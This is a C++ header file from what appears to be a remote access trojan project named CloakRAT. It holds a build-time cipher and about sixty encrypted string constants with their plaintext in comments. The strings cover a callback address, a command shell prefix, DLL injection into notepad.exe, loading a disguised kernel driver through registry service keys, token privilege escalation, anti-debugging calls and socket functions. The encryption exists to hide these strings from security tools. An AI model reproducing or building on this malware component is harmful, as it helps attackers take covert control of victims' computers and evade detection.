#pragma once

#include <array>

#define BUILD_TIME_CIPHER_BYTE (uint8_t)((i % 4 | ((i * 9) + 2 + BUILD_TIME_KEY[i % BUILD_TIME_KEY.size()] & ((i/2)>>3) * i - BUILD_TIME_KEY[i % BUILD_TIME_KEY.size()]) << (i % 5)) & 0x7F ^ 106)
static std::array<uint8_t, 16> BUILD_TIME_KEY = { 244, 235, 227, 199, 19, 148, 177, 121, 108, 161, 113, 56, 117, 255, 13, 191 };

typedef struct EncryptedBytes {
    uint8_t* data;
    size_t length;
} EncryptedBytes;

// "127.0.0.1"
static uint8_t str_ip_data[] = { 76, 114, 14, 94, 84, 27, 86, 81, 100, 26 };
static EncryptedBytes str_ip = {
    str_ip_data,
    sizeof(str_ip_data)
};

// "cmd.exe /C"
static uint8_t str_cmd_data[] = { 69, 32, 81, 13, 84, 78, 0, 4, 106, 4, 38 };
static EncryptedBytes str_cmd = {
    str_cmd_data,
    sizeof(str_cmd_data)
};

// "C:\Users\tal78\Desktop\Workspace\CloakRAT\x64\Release\CloakRAT.dll"
static uint8_t str_dllPath_data[] = { 83, 0, 6, 53, 47, 88, 29, 19, 57, 119, 17, 24, 10, 92, 64, 117, 38, 22, 35, 66, 31, 6, 28, 101, 125, 4, 10, 6, 1, 123, 24, 10, 31, 7, 59, 1, 39, 2, 75, 59, 111, 31, 48, 113, 108, 77, 44, 27, 47, 7, 44, 40, 61, 22, 36, 2, 78, 4, 97, 18, 43, 106, 8, 7, 78, 23, 76 };
static EncryptedBytes str_dllPath = {
    str_dllPath_data,
    sizeof(str_dllPath_data)
};

// "notepad.exe"
static uint8_t str_procName_data[] = { 28, 45, 83, 29, 31, 91, 25, 5, 100, 78, 29, 28 };
static EncryptedBytes str_procName = {
    str_procName_data,
    sizeof(str_procName_data)
};

// "C:\ProgramData\Microsoft\Windows\Caches\8n9o71o5.sys"
static uint8_t str_kphDriverPathOnDisk_data[] = { 98, 0, 6, 53, 42, 89, 23, 6, 56, 74, 8, 61, 7, 31, 25, 117, 47, 26, 51, 91, 4, 26, 3, 95, 94, 55, 47, 4, 28, 111, 22, 30, 9, 7, 59, 12, 43, 11, 69, 26, 114, 115, 2, 48, 53, 78, 65, 38, 127, 69, 58, 48, 61 };
static EncryptedBytes str_kphDriverPathOnDisk = {
    str_kphDriverPathOnDisk_data,
    sizeof(str_kphDriverPathOnDisk_data)
};

// "\??\C:\ProgramData\Microsoft\Windows\Caches\8n9o71o5.sys"
static uint8_t str_kphDriverNtPath_data[] = { 45, 31, 3, 86, 38, 104, 66, 61, 26, 89, 10, 30, 20, 10, 21, 109, 3, 7, 49, 117, 38, 0, 15, 75, 69, 24, 23, 11, 6, 87, 46, 0, 20, 63, 23, 26, 59, 63, 99, 8, 77, 35, 9, 122, 6, 65, 30, 112, 37, 92, 120, 38, 123, 93, 11, 56, 81 };
static EncryptedBytes str_kphDriverNtPath = {
    str_kphDriverNtPath_data,
    sizeof(str_kphDriverNtPath_data)
};

// "SYSTEM\CurrentControlSet\Services\8n9o71o5"
static uint8_t str_servicesPath_data[] = { 116, 16, 101, 58, 46, 110, 53, 61, 9, 94, 23, 11, 3, 5, 12, 106, 13, 29, 36, 91, 4, 5, 63, 92, 94, 55, 43, 8, 0, 125, 16, 10, 31, 40, 36, 85, 38, 90, 79, 94, 31, 36, 89 };
static EncryptedBytes str_servicesPath = {
    str_servicesPath_data,
    sizeof(str_servicesPath_data)
};

// "\Registry\Machine\System\CurrentControlSet\Services\8n9o71o5"
static uint8_t str_serviceRegStr_data[] = { 32, 31, 110, 12, 29, 66, 11, 21, 56, 82, 57, 52, 7, 8, 16, 64, 12, 22, 12, 122, 18, 26, 24, 92, 71, 55, 59, 24, 0, 121, 28, 7, 14, 24, 23, 3, 60, 17, 79, 5, 125, 46, 24, 85, 9, 28, 2, 63, 35, 8, 44, 58, 18, 75, 22, 120, 77, 92, 49, 22, 76 };
static EncryptedBytes str_serviceRegStr = {
    str_serviceRegStr_data,
    sizeof(str_serviceRegStr_data)
};

// "ImagePath"
static uint8_t str_ImagePath_data[] = { 106, 10, 81, 8, 29, 78, 40, 0, 62, 67 };
static EncryptedBytes str_ImagePath = {
    str_ImagePath_data,
    sizeof(str_ImagePath_data)
};

// "Type"
static uint8_t str_Type_data[] = { 48, 23, 69, 25, 31 };
static EncryptedBytes str_Type = {
    str_Type_data,
    sizeof(str_Type_data)
};

// "NtSetInformationThread"
static uint8_t str_NtSetInformationThread_data[] = { 65, 13, 72, 58, 31, 95, 49, 15, 44, 68, 23, 20, 7, 31, 17, 70, 12, 39, 56, 91, 14, 8, 8 };
static EncryptedBytes str_NtSetInformationThread = {
    str_NtSetInformationThread_data,
    sizeof(str_NtSetInformationThread_data)
};

// "GetCurrentThread"
static uint8_t str_GetCurrentThread_data[] = { 35, 4, 89, 29, 57, 94, 10, 19, 47, 69, 17, 45, 14, 25, 29, 72, 6 };
static EncryptedBytes str_GetCurrentThread = {
    str_GetCurrentThread_data,
    sizeof(str_GetCurrentThread_data)
};

// "Sleep"
static uint8_t str_Sleep_data[] = { 18, 16, 80, 12, 31, 91 };
static EncryptedBytes str_Sleep = {
    str_Sleep_data,
    sizeof(str_Sleep_data)
};

// "OpenProcess"
static uint8_t str_OpenProcess_data[] = { 68, 12, 76, 12, 20, 123, 10, 14, 41, 78, 22, 10 };
static EncryptedBytes str_OpenProcess = {
    str_OpenProcess_data,
    sizeof(str_OpenProcess_data)
};

// "VirtualAllocEx"
static uint8_t str_VirtualAllocEx_data[] = { 67, 21, 85, 27, 14, 94, 25, 13, 11, 71, 9, 22, 5, 46, 0 };
static EncryptedBytes str_VirtualAllocEx = {
    str_VirtualAllocEx_data,
    sizeof(str_VirtualAllocEx_data)
};

// "WriteProcessMemory"
static uint8_t str_WriteProcessMemory_data[] = { 34, 20, 78, 0, 14, 78, 40, 19, 37, 72, 0, 10, 21, 38, 29, 68, 13, 1, 41 };
static EncryptedBytes str_WriteProcessMemory = {
    str_WriteProcessMemory_data,
    sizeof(str_WriteProcessMemory_data)
};

// "LoadLibraryA"
static uint8_t str_LoadLibraryA_data[] = { 77, 15, 83, 8, 30, 103, 17, 3, 56, 74, 23, 0, 39 };
static EncryptedBytes str_LoadLibraryA = {
    str_LoadLibraryA_data,
    sizeof(str_LoadLibraryA_data)
};

// "NtLoadDriver"
static uint8_t str_NtLoadDriver_data[] = { 23, 13, 72, 37, 21, 74, 28, 37, 56, 66, 19, 28, 20 };
static EncryptedBytes str_NtLoadDriver = {
    str_NtLoadDriver_data,
    sizeof(str_NtLoadDriver_data)
};

// "RtlInitUnicodeString"
static uint8_t str_RtlInitUnicodeString_data[] = { 21, 17, 72, 5, 51, 69, 17, 21, 31, 69, 12, 26, 9, 15, 29, 122, 22, 1, 57, 71, 12 };
static EncryptedBytes str_RtlInitUnicodeString = {
    str_RtlInitUnicodeString_data,
    sizeof(str_RtlInitUnicodeString_data)
};

// "RtlAdjustPrivilege"
static uint8_t str_RtlAdjustPrivilege_data[] = { 9, 17, 72, 5, 59, 79, 18, 20, 57, 95, 53, 11, 15, 29, 17, 69, 7, 20, 53 };
static EncryptedBytes str_RtlAdjustPrivilege = {
    str_RtlAdjustPrivilege_data,
    sizeof(str_RtlAdjustPrivilege_data)
};

// "RegSetKeyValueA"
static uint8_t str_RegSetKeyValueA_data[] = { 113, 17, 89, 14, 41, 78, 12, 42, 47, 82, 51, 24, 10, 30, 29, 104 };
static EncryptedBytes str_RegSetKeyValueA = {
    str_RegSetKeyValueA_data,
    sizeof(str_RegSetKeyValueA_data)
};

// "RegCreateKeyA"
static uint8_t str_RegCreateKeyA_data[] = { 85, 17, 89, 14, 57, 89, 29, 0, 62, 78, 46, 28, 31, 42 };
static EncryptedBytes str_RegCreateKeyA = {
    str_RegCreateKeyA_data,
    sizeof(str_RegCreateKeyA_data)
};

// "RegCloseKey"
static uint8_t str_RegCloseKey_data[] = { 120, 17, 89, 14, 57, 71, 23, 18, 47, 96, 0, 0 };
static EncryptedBytes str_RegCloseKey = {
    str_RegCloseKey_data,
    sizeof(str_RegCloseKey_data)
};

// "CreateRemoteThread"
static uint8_t str_CreateRemoteThread_data[] = { 25, 0, 78, 12, 27, 95, 29, 51, 47, 70, 10, 13, 3, 63, 16, 91, 7, 18, 52 };
static EncryptedBytes str_CreateRemoteThread = {
    str_CreateRemoteThread_data,
    sizeof(str_CreateRemoteThread_data)
};

// "CloseHandle"
static uint8_t str_CloseHandle_data[] = { 44, 0, 80, 6, 9, 78, 48, 0, 36, 79, 9, 28 };
static EncryptedBytes str_CloseHandle = {
    str_CloseHandle_data,
    sizeof(str_CloseHandle_data)
};

// "LookupPrivilegeValueA"
static uint8_t str_LookupPrivilegeValueA_data[] = { 110, 15, 83, 6, 17, 94, 8, 49, 56, 66, 19, 16, 10, 14, 31, 76, 52, 18, 60, 92, 14, 40 };
static EncryptedBytes str_LookupPrivilegeValueA = {
    str_LookupPrivilegeValueA_data,
    sizeof(str_LookupPrivilegeValueA_data)
};

// "GetLastError"
static uint8_t str_GetLastError_data[] = { 39, 4, 89, 29, 54, 74, 11, 21, 15, 89, 23, 22, 20 };
static EncryptedBytes str_GetLastError = {
    str_GetLastError_data,
    sizeof(str_GetLastError_data)
};

// "AdjustTokenPrivileges"
static uint8_t str_AdjustTokenPrivileges_data[] = { 113, 2, 88, 3, 15, 88, 12, 53, 37, 64, 0, 23, 54, 25, 17, 95, 11, 31, 53, 78, 14, 26 };
static EncryptedBytes str_AdjustTokenPrivileges = {
    str_AdjustTokenPrivileges_data,
    sizeof(str_AdjustTokenPrivileges_data)
};

// "OpenProcessToken"
static uint8_t str_OpenProcessToken_data[] = { 15, 12, 76, 12, 20, 123, 10, 14, 41, 78, 22, 10, 50, 4, 19, 76, 12 };
static EncryptedBytes str_OpenProcessToken = {
    str_OpenProcessToken_data,
    sizeof(str_OpenProcessToken_data)
};

// "GetCurrentProcess"
static uint8_t str_GetCurrentProcess_data[] = { 117, 4, 89, 29, 57, 94, 10, 19, 47, 69, 17, 41, 20, 4, 27, 76, 17, 0 };
static EncryptedBytes str_GetCurrentProcess = {
    str_GetCurrentProcess_data,
    sizeof(str_GetCurrentProcess_data)
};

// "CreateToolhelp32Snapshot"
static uint8_t str_CreateToolhelp32Snapshot_data[] = { 13, 0, 78, 12, 27, 95, 29, 53, 37, 68, 9, 17, 3, 7, 8, 26, 80, 32, 62, 72, 27, 26, 4, 86, 94 };
static EncryptedBytes str_CreateToolhelp32Snapshot = {
    str_CreateToolhelp32Snapshot_data,
    sizeof(str_CreateToolhelp32Snapshot_data)
};

// "Process32First"
static uint8_t str_Process32First_data[] = { 51, 19, 78, 6, 25, 78, 11, 18, 121, 25, 35, 16, 20, 24, 12 };
static EncryptedBytes str_Process32First = {
    str_Process32First_data,
    sizeof(str_Process32First_data)
};

// "Process32Next"
static uint8_t str_Process32Next_data[] = { 57, 19, 78, 6, 25, 78, 11, 18, 121, 25, 43, 28, 30, 31 };
static EncryptedBytes str_Process32Next = {
    str_Process32Next_data,
    sizeof(str_Process32Next_data)
};

// "CreatePipe"
static uint8_t str_CreatePipe_data[] = { 95, 0, 78, 12, 27, 95, 29, 49, 35, 91, 0 };
static EncryptedBytes str_CreatePipe = {
    str_CreatePipe_data,
    sizeof(str_CreatePipe_data)
};

// "SetHandleInformation"
static uint8_t str_SetHandleInformation_data[] = { 66, 16, 89, 29, 50, 74, 22, 5, 38, 78, 44, 23, 0, 4, 10, 68, 3, 7, 57, 70, 5 };
static EncryptedBytes str_SetHandleInformation = {
    str_SetHandleInformation_data,
    sizeof(str_SetHandleInformation_data)
};

// "ReadFile"
static uint8_t str_ReadFile_data[] = { 80, 17, 89, 8, 30, 109, 17, 13, 47 };
static EncryptedBytes str_ReadFile = {
    str_ReadFile_data,
    sizeof(str_ReadFile_data)
};

// "FormatMessageA"
static uint8_t str_FormatMessageA_data[] = { 61, 5, 83, 27, 23, 74, 12, 44, 47, 88, 22, 24, 1, 14, 57 };
static EncryptedBytes str_FormatMessageA = {
    str_FormatMessageA_data,
    sizeof(str_FormatMessageA_data)
};

// "LocalFree"
static uint8_t str_LocalFree_data[] = { 105, 15, 83, 10, 27, 71, 62, 19, 47, 78 };
static EncryptedBytes str_LocalFree = {
    str_LocalFree_data,
    sizeof(str_LocalFree_data)
};

// "CreateProcessA"
static uint8_t str_CreateProcessA_data[] = { 62, 0, 78, 12, 27, 95, 29, 49, 56, 68, 6, 28, 21, 24, 57 };
static EncryptedBytes str_CreateProcessA = {
    str_CreateProcessA_data,
    sizeof(str_CreateProcessA_data)
};

// "IsDebuggerPresent"
static uint8_t str_IsDebuggerPresent_data[] = { 27, 10, 79, 45, 31, 73, 13, 6, 45, 78, 23, 41, 20, 14, 11, 76, 12, 7 };
static EncryptedBytes str_IsDebuggerPresent = {
    str_IsDebuggerPresent_data,
    sizeof(str_IsDebuggerPresent_data)
};

// "GetModuleHandleW"
static uint8_t str_GetModuleHandleW_data[] = { 81, 4, 89, 29, 55, 68, 28, 20, 38, 78, 45, 24, 8, 15, 20, 76, 53 };
static EncryptedBytes str_GetModuleHandleW = {
    str_GetModuleHandleW_data,
    sizeof(str_GetModuleHandleW_data)
};

// "VirtualProtect"
static uint8_t str_VirtualProtect_data[] = { 109, 21, 85, 27, 14, 94, 25, 13, 26, 89, 10, 13, 3, 8, 12 };
static EncryptedBytes str_VirtualProtect = {
    str_VirtualProtect_data,
    sizeof(str_VirtualProtect_data)
};

// "HeapSetInformation"
static uint8_t str_HeapSetInformation_data[] = { 109, 11, 89, 8, 10, 120, 29, 21, 3, 69, 3, 22, 20, 6, 25, 93, 11, 28, 62 };
static EncryptedBytes str_HeapSetInformation = {
    str_HeapSetInformation_data,
    sizeof(str_HeapSetInformation_data)
};

// "FindWindowW"
static uint8_t str_FindWindowW_data[] = { 125, 5, 85, 7, 30, 124, 17, 15, 46, 68, 18, 46 };
static EncryptedBytes str_FindWindowW = {
    str_FindWindowW_data,
    sizeof(str_FindWindowW_data)
};

// "GetProcessHeap"
static uint8_t str_GetProcessHeap_data[] = { 23, 4, 89, 29, 42, 89, 23, 2, 47, 88, 22, 49, 3, 10, 8 };
static EncryptedBytes str_GetProcessHeap = {
    str_GetProcessHeap_data,
    sizeof(str_GetProcessHeap_data)
};

// "GetComputerNameW"
static uint8_t str_GetComputerNameW_data[] = { 28, 4, 89, 29, 57, 68, 21, 17, 63, 95, 0, 11, 40, 10, 21, 76, 53 };
static EncryptedBytes str_GetComputerNameW = {
    str_GetComputerNameW_data,
    sizeof(str_GetComputerNameW_data)
};

// "OpenThread"
static uint8_t str_OpenThread_data[] = { 46, 12, 76, 12, 20, 127, 16, 19, 47, 74, 1 };
static EncryptedBytes str_OpenThread = {
    str_OpenThread_data,
    sizeof(str_OpenThread_data)
};

// "GetEnvironmentVariableW"
static uint8_t str_GetEnvironmentVariableW_data[] = { 18, 4, 89, 29, 63, 69, 14, 8, 56, 68, 11, 20, 3, 5, 12, 127, 3, 1, 57, 72, 9, 5, 9, 110 };
static EncryptedBytes str_GetEnvironmentVariableW = {
    str_GetEnvironmentVariableW_data,
    sizeof(str_GetEnvironmentVariableW_data)
};

// "GetThreadContext"
static uint8_t str_GetThreadContext_data[] = { 30, 4, 89, 29, 46, 67, 10, 4, 43, 79, 38, 22, 8, 31, 29, 81, 22 };
static EncryptedBytes str_GetThreadContext = {
    str_GetThreadContext_data,
    sizeof(str_GetThreadContext_data)
};

// "IsWow64Process"
static uint8_t str_IsWow64Process_data[] = { 91, 10, 79, 62, 21, 92, 78, 85, 26, 89, 10, 26, 3, 24, 11 };
static EncryptedBytes str_IsWow64Process = {
    str_IsWow64Process_data,
    sizeof(str_IsWow64Process_data)
};

// "GetWindowLongPtrW"
static uint8_t str_GetWindowLongPtrW_data[] = { 28, 4, 89, 29, 45, 66, 22, 5, 37, 92, 41, 22, 8, 12, 40, 93, 16, 36 };
static EncryptedBytes str_GetWindowLongPtrW = {
    str_GetWindowLongPtrW_data,
    sizeof(str_GetWindowLongPtrW_data)
};

// "GetWindowRect"
static uint8_t str_GetWindowRect_data[] = { 91, 4, 89, 29, 45, 66, 22, 5, 37, 92, 55, 28, 5, 31 };
static EncryptedBytes str_GetWindowRect = {
    str_GetWindowRect_data,
    sizeof(str_GetWindowRect_data)
};

// "WSAStartup"
static uint8_t str_WSAStartup_data[] = { 14, 20, 111, 40, 41, 95, 25, 19, 62, 94, 21 };
static EncryptedBytes str_WSAStartup = {
    str_WSAStartup_data,
    sizeof(str_WSAStartup_data)
};

// "htons"
static uint8_t str_htons_data[] = { 44, 43, 72, 6, 20, 88 };
static EncryptedBytes str_htons = {
    str_htons_data,
    sizeof(str_htons_data)
};

// "inet_pton"
static uint8_t str_inet_pton_data[] = { 118, 42, 82, 12, 14, 116, 8, 21, 37, 69 };
static EncryptedBytes str_inet_pton = {
    str_inet_pton_data,
    sizeof(str_inet_pton_data)
};

// "connect"
static uint8_t str_connect_data[] = { 102, 32, 83, 7, 20, 78, 27, 21 };
static EncryptedBytes str_connect = {
    str_connect_data,
    sizeof(str_connect_data)
};

// "htonl"
static uint8_t str_htonl_data[] = { 106, 43, 72, 6, 20, 71 };
static EncryptedBytes str_htonl = {
    str_htonl_data,
    sizeof(str_htonl_data)
};

// "send"
static uint8_t str_send_data[] = { 58, 48, 89, 7, 30 };
static EncryptedBytes str_send = {
    str_send_data,
    sizeof(str_send_data)
};

// "socket"
static uint8_t str_socket_data[] = { 115, 48, 83, 10, 17, 78, 12 };
static EncryptedBytes str_socket = {
    str_socket_data,
    sizeof(str_socket_data)
};

// "recv"
static uint8_t str_recv_data[] = { 63, 49, 89, 10, 12 };
static EncryptedBytes str_recv = {
    str_recv_data,
    sizeof(str_recv_data)
};

// "ntohl"
static uint8_t str_ntohl_data[] = { 114, 45, 72, 6, 18, 71 };
static EncryptedBytes str_ntohl = {
    str_ntohl_data,
    sizeof(str_ntohl_data)
};

// "closesocket"
static uint8_t str_closesocket_data[] = { 92, 32, 80, 6, 9, 78, 11, 14, 41, 64, 0, 13 };
static EncryptedBytes str_closesocket = {
    str_closesocket_data,
    sizeof(str_closesocket_data)
};

// "WSACleanup"
static uint8_t str_WSACleanup_data[] = { 105, 20, 111, 40, 57, 71, 29, 0, 36, 94, 21 };
static EncryptedBytes str_WSACleanup = {
    str_WSACleanup_data,
    sizeof(str_WSACleanup_data)
};

// "kernel32.dll"
static uint8_t str_kernel32_data[] = { 84, 40, 89, 27, 20, 78, 20, 82, 120, 5, 1, 21, 10 };
static EncryptedBytes str_kernel32 = {
    str_kernel32_data,
    sizeof(str_kernel32_data)
};

// "ntdll.dll"
static uint8_t str_ntdll_data[] = { 43, 45, 72, 13, 22, 71, 86, 5, 38, 71 };
static EncryptedBytes str_ntdll = {
    str_ntdll_data,
    sizeof(str_ntdll_data)
};

// "advapi32.dll"
static uint8_t str_advapi32_data[] = { 78, 34, 88, 31, 27, 91, 17, 82, 120, 5, 1, 21, 10 };
static EncryptedBytes str_advapi32 = {
    str_advapi32_data,
    sizeof(str_advapi32_data)
};

// "ws2_32.dll"
static uint8_t str_ws2_32_data[] = { 101, 52, 79, 91, 37, 24, 74, 79, 46, 71, 9 };
static EncryptedBytes str_ws2_32 = {
    str_ws2_32_data,
    sizeof(str_ws2_32_data)
};

// "user32.dll"
static uint8_t str_user32_data[] = { 69, 54, 79, 12, 8, 24, 74, 79, 46, 71, 9 };
static EncryptedBytes str_user32 = {
    str_user32_data,
    sizeof(str_user32_data)
};

// "WSAGetLastError"
static uint8_t str_WSAGetLastError_data[] = { 5, 20, 111, 40, 61, 78, 12, 45, 43, 88, 17, 60, 20, 25, 23, 91 };
static EncryptedBytes str_WSAGetLastError = {
    str_WSAGetLastError_data,
    sizeof(str_WSAGetLastError_data)
};

